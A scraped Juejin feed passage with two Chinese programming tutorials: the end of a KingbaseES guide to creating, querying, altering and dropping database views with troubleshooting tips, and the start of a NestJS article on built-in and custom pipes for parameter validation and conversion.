<li>简化复杂查询，要是有很多表关联查询（JOIN），可以把它封装成视图，后面查数据直接用视图就行，不用再写一遍复杂的SQL，多省事儿。</li>
<li>控制数据权限，比如想让普通用户只看到<code>sys_user</code>表里的<code>name</code>和<code>phone</code>字段，把<code>email</code>这种敏感信息藏起来，用视图就能做到。</li>
<li>保证数据一致性，要是多个系统都用同一个查询逻辑，用视图就能确保所有系统都用一样的筛选条件，不会出乱子。</li>
</ol>
<h4 data-id="heading-20">3.2 创建视图：用CREATE VIEW语句</h4>
<h5 data-id="heading-21">3.2.1 示例1：基础视图（简化单表查询）</h5>
<p>咱创建一个“用户基础信息视图<code>vw_sys_user_basic</code>”，里面只包含<code>id</code>、<code>name</code>、<code>phone</code>列，把<code>email</code>这种敏感信息藏起来。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：CREATE VIEW 视图名 AS SELECT 语句;</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> vw_sys_user_basic <span class="hljs-keyword">AS</span>
<span class="hljs-keyword">SELECT</span> id, name, phone 
<span class="hljs-keyword">FROM</span> test_schema.sys_user;
</code></pre>
<ul>
<li><strong>成功验证</strong>：执行后提示<code>CREATE VIEW</code>，就说明视图建好了。</li>
</ul>
<h5 data-id="heading-22">3.2.2 示例2：进阶视图（带筛选条件的复杂查询）</h5>
<p>再创建一个“2024年创建的用户视图<code>vw_sys_user_2024</code>”，筛选出<code>create_time</code>在2024年的用户，里面包含<code>name</code>、<code>email</code>、<code>create_time</code>列。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> vw_sys_user_2024 <span class="hljs-keyword">AS</span>
<span class="hljs-keyword">SELECT</span> name, email, create_time 
<span class="hljs-keyword">FROM</span> test_schema.sys_user 
<span class="hljs-keyword">WHERE</span> create_time <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'2024-01-01 00:00:00'</span> 
  <span class="hljs-keyword">AND</span> create_time <span class="hljs-operator">&lt;</span> <span class="hljs-string">'2025-01-01 00:00:00'</span>;
</code></pre>
<ul>
<li><strong>动态性</strong>：这里得说一下，视图里的数据会跟着原表自动变。比如原表新增了一个2024年创建的用户，视图里也会自动包含这条数据，不用手动更新。</li>
</ul>
<h5 data-id="heading-23">3.2.3 示例3：只读视图（禁止修改数据）</h5>
<p>要是想确保视图里的数据不能被改，比如报表视图，那就加个<code>WITH READ ONLY</code>选项。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> vw_sys_user_report <span class="hljs-keyword">AS</span>
<span class="hljs-keyword">SELECT</span> name, phone, create_time 
<span class="hljs-keyword">FROM</span> test_schema.sys_user 
<span class="hljs-keyword">WITH</span> READ <span class="hljs-keyword">ONLY</span>;
</code></pre>
<ul>
<li><strong>效果</strong>：后面要是想通过这个视图改数据，比如执行<code>UPDATE vw_sys_user_report SET name='张三'</code>，就会报错“cannot update a read-only view”，根本改不了。</li>
</ul>
<h4 data-id="heading-24">3.3 查看视图：确认视图定义与关联表</h4>
<p>建完视图，得用ksql命令看看视图列表、定义还有关联的表，推荐用<code>\dv</code>和<code>\d+</code>这两个命令。</p>
<h5 data-id="heading-25">3.3.1 示例1：查看所有视图（\dv命令）</h5>
<p>执行<code>\dv</code>就能列出当前模式下的所有视图，能快速确认视图是不是建成功了。</p>
<h5 data-id="heading-26">3.3.2 示例2：查看视图定义（\d+视图名）</h5>
<p>要是忘了视图的筛选条件，想确认一下视图的底层SQL，执行<code>\d+ 视图名</code>就行。</p>
<pre><code class="hljs language-sql" lang="sql">\d<span class="hljs-operator">+</span> vw_sys_user_2024
</code></pre>
<p><strong>执行结果示例（定义部分）</strong>：
这样能直接看到视图完整的SQL定义，后面想修改或者验证逻辑都很方便。</p>
<h4 data-id="heading-27">3.4 视图操作：查询、修改与删除</h4>
<p>视图最主要的操作是“查询”，修改和删除都有特定的规则，可不能随便来。</p>
<h5 data-id="heading-28">3.4.1 示例1：查询视图数据（与表查询一致）</h5>
<p>查询视图数据的语法和查表一模一样，不用额外学新东西。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查询基础视图数据</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> vw_sys_user_basic;
<span class="hljs-comment">-- 查询2024年用户视图，按创建时间排序</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> vw_sys_user_2024 <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> create_time <span class="hljs-keyword">DESC</span>;
</code></pre>
<ul>
<li><strong>效果</strong>：返回的结果和查原表筛选后的数据一样，但看不到那些被隐藏的列，比如在<code>vw_sys_user_basic</code>里就看不到<code>email</code>列。</li>
</ul>
<h5 data-id="heading-29">3.4.2 示例2：修改视图定义（CREATE OR REPLACE）</h5>
<p>要是想调整视图的筛选条件或者包含的列，比如把<code>vw_sys_user_2024</code>改成包含2023年的数据，不用删了视图重新建，直接用<code>CREATE OR REPLACE</code>修改就行。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">VIEW</span> vw_sys_user_2024 <span class="hljs-keyword">AS</span>
<span class="hljs-keyword">SELECT</span> name, email, create_time 
<span class="hljs-keyword">FROM</span> test_schema.sys_user 
<span class="hljs-keyword">WHERE</span> create_time <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'2023-01-01 00:00:00'</span> 
  <span class="hljs-keyword">AND</span> create_time <span class="hljs-operator">&lt;</span> <span class="hljs-string">'2025-01-01 00:00:00'</span>;
</code></pre>
<ul>
<li><strong>验证</strong>：执行<code>\d+ vw_sys_user_2024</code>，确认视图定义已经更新了就行。</li>
</ul>
<h5 data-id="heading-30">3.4.3 示例3：删除视图（DROP VIEW）</h5>
<p>要是某个视图不用了，就把它删掉。放心，<strong>删除视图不会影响原表数据</strong>，只是把视图的定义删掉了。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：DROP VIEW IF EXISTS 视图名;</span>
<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">VIEW</span> IF <span class="hljs-keyword">EXISTS</span> vw_sys_user_report;
</code></pre>
<ul>
<li><strong>验证</strong>：执行<code>\dv</code>，确认视图已经删掉了就可以。</li>
</ul>
<h4 data-id="heading-31">3.5 视图使用注意事项（新手避坑指南）</h4>
<ol>
<li>视图修改有不少限制，就算没加<code>READ ONLY</code>，只要有下面这些情况，也没法改数据：
<ul>
<li>视图里包含<code>DISTINCT</code>（去重）、<code>GROUP BY</code>（分组）、<code>HAVING</code>（筛选分组）；</li>
<li>视图里有聚合函数，比如<code>COUNT</code>、<code>SUM</code>；</li>
<li>视图是从多个表关联（<code>JOIN</code>）来的；</li>
</ul>
</li>
<li>要是原表被删了，比如<code>sys_user</code>表没了，那对应的视图就成了“无效视图”，再查这个视图就会报错“relation does not exist”。</li>
<li>性能方面也得注意，要是视图很复杂，包含多表关联或者聚合操作，它的查询效率就看原表有没有索引。所以原表里那些相关的字段，比如多表<code>JOIN</code>时用到的关联列，一定要提前建好索引。</li>
</ol>
<h3 data-id="heading-32">四、常见问题排查：索引与视图的高频报错</h3>
<h4 data-id="heading-33">问题1：创建索引报错“重复的键名”</h4>
<p><strong>报错信息</strong>：</p>
<pre><code class="hljs language-plaintext" lang="plaintext">ERROR:  duplicate key name "idx_sys_user_phone"
</code></pre>
<p><strong>原因</strong>：这明显是同名的索引已经存在了，比如之前已经创建过<code>idx_sys_user_phone</code>。
<strong>解决方案</strong>：</p>
<ul>
<li>先执行<code>\di</code>看看索引名，确认是不是真的重复了；</li>
<li>要是想重新建这个索引，先把旧的删掉，执行<code>DROP INDEX idx_sys_user_phone;</code>，然后再建新的。</li>
</ul>
<h4 data-id="heading-34">问题2：查询视图报错“关系对象不存在”</h4>
<p><strong>报错信息</strong>：</p>
<pre><code class="hljs language-plaintext" lang="plaintext">ERROR:  relation "vw_sys_user_basic" does not exist
</code></pre>
<p><strong>原因</strong>：</p>
<ol>
<li>要么是视图名拼错了，比如把<code>vw_sys_user_basic</code>写成了<code>vw_sys_user_basci</code>；</li>
<li>要么是视图所在的模式不在搜索路径里，比如视图在<code>test_schema</code>模式下，但当前的搜索路径是<code>public</code>。
<strong>解决方案</strong>：</li>
</ol>
<ul>
<li>先检查视图名拼写对不对，执行<code>\dv</code>确认一下正确的名称；</li>
<li>要么切换到视图所在的模式，执行<code>SET search_path TO test_schema, public;</code>；要么查询的时候用“模式名.视图名”的全称，比如<code>SELECT * FROM test_schema.vw_sys_user_basic;</code>。</li>
</ul>
<h4 data-id="heading-35">问题3：通过视图修改数据报错“无法更新只读视图”</h4>
<p><strong>报错信息</strong>：</p>
<pre><code class="hljs language-plaintext" lang="plaintext">ERROR:  cannot update a read-only view "vw_sys_user_report"
</code></pre>
<p><strong>原因</strong>：这是因为创建视图的时候加了<code>WITH READ ONLY</code>选项，就是禁止修改的。
<strong>解决方案</strong>：</p>
<ul>
<li>
<p>要是想允许修改，就重新创建视图，把<code>WITH READ ONLY</code>去掉：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">VIEW</span> vw_sys_user_report <span class="hljs-keyword">AS</span>
<span class="hljs-keyword">SELECT</span> name, phone, create_time <span class="hljs-keyword">FROM</span> sys_user;
</code></pre>
</li>
<li>
<p>不过要注意，重新创建之前得确认这个视图没有其他修改限制，比如不含<code>GROUP BY</code>、聚合函数这些。</p>
</li>
</ul>
<h3 data-id="heading-36">五、总结：索引与视图的配合使用</h3>
<p>今天把索引和视图的核心操作都讲透了，核心要点总结一下：</p>
<ol>
<li><strong>索引</strong>：主要管“查询速度”，得根据查询场景选普通、唯一还是复合索引，别建太多，还得定时重建优化性能；</li>
<li><strong>视图</strong>：主要管“查询简化和权限控制”，能把复杂逻辑封装起来，隐藏敏感数据，但要注意修改限制和对原表的依赖；</li>
<li><strong>配合使用</strong>：视图的查询速度和原表的索引有关系，比如给<code>vw_sys_user_2024</code>视图对应的<code>sys_user</code>原表建个<code>create_time</code>索引，视图的查询效率能提升不少。</li>
</ol>
<p>学会了索引和视图，你在KingbaseES里查数据就能又快又方便了。下一篇咱就讲“用户与权限管理”，让数据库访问更安全，实现“不同用户看不同数据”的精细控制。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何自定义 Pipe？]]></title>    <link>https://juejin.cn/post/7602259669707358234</link>    <guid>https://juejin.cn/post/7602259669707358234</guid>    <pubDate>2026-02-03T02:42:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602259669707358234" data-draft-id="7599917711794012170" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何自定义 Pipe？"/> <meta itemprop="keywords" content="前端,NestJS,Node.js"/> <meta itemprop="datePublished" content="2026-02-03T02:42:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端付豪"/> <meta itemprop="url" content="https://juejin.cn/user/1741228277763278"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何自定义 Pipe？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1741228277763278/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端付豪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T02:42:46.000Z" title="Tue Feb 03 2026 02:42:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Pipe 是在参数传给 Controller 之前做一些验证和转换的，有 多个内置的 Pipe 可以直接用</p>
<p>Nest 一次请求的顺序是：</p>
<pre><code class="hljs language-scss" lang="scss">Middleware
  ↓
Guard
  ↓
Interceptor (before)
  ↓
Pipe   ✅（就在这里）
  ↓
Controller handler
  ↓
Interceptor (after)
  ↓
ExceptionFilter
</code></pre>
<p>👉 <strong>Pipe 发生在 handler 真正被调用之前，而且是“参数级别”执行</strong></p>
<h2 data-id="heading-0">Pipe 的接口定义</h2>
<pre><code class="hljs language-r" lang="r">export interface PipeTransform<span class="hljs-operator">&lt;</span><span class="hljs-built_in">T</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">any</span><span class="hljs-punctuation">,</span> R <span class="hljs-operator">=</span> <span class="hljs-built_in">any</span><span class="hljs-operator">&gt;</span> <span class="hljs-punctuation">{</span>
  transform<span class="hljs-punctuation">(</span>value<span class="hljs-operator">:</span> <span class="hljs-built_in">T</span><span class="hljs-punctuation">,</span> metadata<span class="hljs-operator">:</span> ArgumentMetadata<span class="hljs-punctuation">)</span><span class="hljs-operator">:</span> R;
<span class="hljs-punctuation">}</span>
</code></pre>
<p><code>ArgumentMetadata</code> 是关键：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ArgumentMetadata</span> {
  <span class="hljs-attr">type</span>: <span class="hljs-string">'body'</span> | <span class="hljs-string">'query'</span> | <span class="hljs-string">'param'</span> | <span class="hljs-string">'custom'</span>;
  metatype?: <span class="hljs-title class_">Type</span>&lt;<span class="hljs-built_in">any</span>&gt;;
  data?: <span class="hljs-built_in">string</span>;
}
</code></pre>
<p>也就是说，Pipe 能知道：</p>
<ul>
<li>这个参数来自哪里（body / query / param）</li>
<li>DTO 是什么 class</li>
<li>装饰器里写的是 <code>@Body('id')</code> 还是整个 body</li>
</ul>
<p>内置的 Pipe 有这些：</p>
<ul>
<li>ValidationPipe</li>
<li>ParseIntPipe</li>
<li>ParseBoolPipe</li>
<li>ParseArrayPipe</li>
<li>ParseUUIDPipe</li>
<li>DefaultValuePipe</li>
<li>ParseEnumPipe</li>
<li>ParseFloatPipe</li>
<li>ParseFilePipe</li>
</ul>
<p>看一下使用</p>
<pre><code class="hljs language-sql" lang="sql">nest <span class="hljs-keyword">new</span> pipe<span class="hljs-operator">-</span><span class="hljs-keyword">inner</span> <span class="hljs-operator">-</span>p npm
</code></pre>
<p>ParseIntPipe</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65cb8d85ae4446358d46a1627722c3f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=NR%2F2YFkHLr8K5ZaXJsvK63bYsXE%3D" alt="image.png" loading="lazy"/></p>
<p>如果可以转正常展示</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b50fcc495bde42bf90d1750aa20b8b3b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=Lac9Ai%2FR2pECjm1qr89nDjeR7Vw%3D" alt="image.png" loading="lazy"/></p>
<p>如果不可以转 报错</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca7927ce7f444f729bfdb7585942dd07~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=ImH1ukExtVLd%2BUgCauHk%2F45ZUgo%3D" alt="image.png" loading="lazy"/></p>
<p>状态码和信息也可以改</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba13e1fe6750492cb595f0b8862199b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=KrQGZuBs4ZMJ%2F%2BtpkFNpXePG6%2FE%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cfbf0abd48e0421fa818187c061bc4ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=8PL5qxrcNp4ppKO7BfgaF67BPt4%3D" alt="image.png" loading="lazy"/></p>
<p>可以自己抛一个异常出来，然后让 exception filter 处理</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7750fc6740f44e61974fc0aa43d000bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=K9khwHum0NTY4DVTWAW%2FPq3H7Eg%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f46c012f181f488eb9ecb38bb9cb4ec5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=y8yimWfYOFix3ikcrw0dHUN6xLs%3D" alt="image.png" loading="lazy"/></p>
<p>ParseFloatPipe 是把参数转换为 float 类型</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ca7c655bc624e4b9876abf97880c838~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=04Xwac2e%2FeTARc%2FcbeAVUVEIETE%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84e2ff5a29974aba8a296369122fa25c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=O4DbH0GyVvNyvlmBLSM8hcVR7go%3D" alt="image.png" loading="lazy"/></p>
<p>也可以 new ParseFloatPipe 的形式，传入 errorHttpStatusCode 和 exceptionFactory</p>
<p>ParseBoolPipe</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a6f6812aaab9451c9bec3f72fa31b942~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=Cx0cOMr%2FkaSmJyAefAKrVKj4bPk%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0f6d6d3799d44608e44af1f74fa7655~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=Q%2FweJ0swMPgSjKZsihfY5qGjRAA%3D" alt="image.png" loading="lazy"/></p>
<p>ParseArrayPipe</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d809d6527e1b413ebc5e9d28df11f09c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=PG2V%2B2e7IE20sSsdHkFvzM8VC10%3D" alt="image.png" loading="lazy"/></p>
<p>需要安装</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/245f6867406a4b68ac05e14806a78d9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=DLeoP6sVv0dul8oO2Co1DbYCqrA%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">npm install -D <span class="hljs-keyword">class</span>-validator <span class="hljs-keyword">class</span>-transformer
</code></pre>
<p>没有转为数字</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8dfdc00592ba452bbac7080833599310~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=wbywhvmWVhliMwlNlC%2BsA%2FvfPmI%3D" alt="image.png" loading="lazy"/></p>
<p>指定 item 的类型</p>
<p>这样就把数组每一项处理为 number</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c6dfa16440546a2aef21d0011e4d8e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=DE1aEz%2BDTkjrY%2F%2FQ2z%2Bn%2B1eq9i0%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0da3387d863645db8ba7d2c6cabf4c79~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=tP7Kc0Eo9hkM97FIbnPbfURPU0A%3D" alt="image.png" loading="lazy"/></p>
<p>ParseEnumPipe</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/194ba572039543c09d487648d1c17bb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=7YI2j2MwsPrWPdVCikKJWkDKKvs%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b0769c791e44936b42b066483586d55~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=AaXLna%2BoK1vbjoXjpuO3rzWG1yI%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6700ea7e96a485a907de3745edea495~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=%2FC%2BBHVOExyDckceAsytI0d3Fuqk%3D" alt="image.png" loading="lazy"/></p>
<p>参数不是枚举值内</p>
